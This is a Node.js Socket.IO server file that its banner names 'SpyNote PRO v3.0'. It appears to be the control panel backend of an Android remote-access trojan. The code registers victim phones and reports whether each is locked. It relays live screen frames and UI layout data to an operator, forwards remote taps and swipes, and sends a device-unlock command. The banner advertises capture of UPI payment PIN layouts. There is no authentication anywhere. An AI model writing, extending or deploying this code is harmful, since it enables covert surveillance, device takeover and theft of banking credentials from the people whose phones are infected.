const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000,
    maxHttpBufferSize: 100e6 // 100MB for HD + Layout
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '200mb' }));
app.use(express.urlencoded({ limit: '200mb', extended: true }));

const devices = new Map();

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id,
                lastSeen: Date.now()
            });
            socket.join(`device_${deviceId}`);
            console.log('📱 Device registered:', deviceId, deviceInfo.model, 
                       deviceInfo.screenLocked ? '🔒 LOCKED' : '✅ UNLOCKED');
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    socket.on('device-ready', (deviceId) => {
        if (devices.has(deviceId)) {
            const device = devices.get(deviceId);
            devices.set(deviceId, { ...device, status: 'streaming' });
        }
    });

    // 🔥 ULTRA LOW LATENCY FRAME + LAYOUT RELAY
    socket.on('screen-frame', (frameData) => {
        const deviceId = frameData.deviceId;
        if (devices.has(deviceId)) {
            devices.get(deviceId).lastSeen = Date.now();
            socket.to(`device_${deviceId}`).emit('screen-frame', frameData);
        }
    });

    socket.on('layout-hierarchy', (layoutData) => {
        const deviceId = layoutData.deviceId;
        if (devices.has(deviceId)) {
            socket.to(`device_${deviceId}`).emit('layout-hierarchy', layoutData);
        }
    });

    // 🔥 INSTANT CONTROL RELAY
    socket.on('control', (controlData) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = controlData;
        if (devices.has(deviceId)) {
            socket.to(`device_${deviceId}`).emit('control', {
                action,
                x: parseFloat(x) || 0,
                y: parseFloat(y) || 0,
                startX: parseFloat(startX) || 0,
                startY: parseFloat(startY) || 0,
                endX: parseFloat(endX) || 0,
                endY: parseFloat(endY) || 0
            });
            console.log(`🎮 ${action.toUpperCase()} → ${deviceId.slice(0,8)} (${Math.round(x || 0)},${Math.round(y || 0)})`);
        }
    });

    socket.on('unlock-device', (data) => {
        const { deviceId } = data;
        if (devices.has(deviceId)) {
            socket.to(`device_${deviceId}`).emit('unlock-device');
            console.log(`🔓 UNLOCK → ${deviceId.slice(0,8)}`);
        }
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Device offline:', deviceId);
                break;
            }
        }
    });
});

// Keep-alive + Screen Lock Detection
setInterval(() => {
    const now = Date.now();
    for (const [deviceId, info] of devices.entries()) {
        if (info.connected && (now - info.lastSeen > 45000)) {
            devices.set(deviceId, { ...info, connected: false });
            io.emit('devices-update', Array.from(devices.entries()));
        }
    }
}, 30000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 SpyNote PRO v3.0 - LAYOUT + SCREEN OFF`);
    console.log(`🌐 Web: http://localhost:${PORT}`);
    console.log(`✅ UPI PIN LAYOUT • SMOOTH 30FPS • ANDROID 14+ READY`);
});
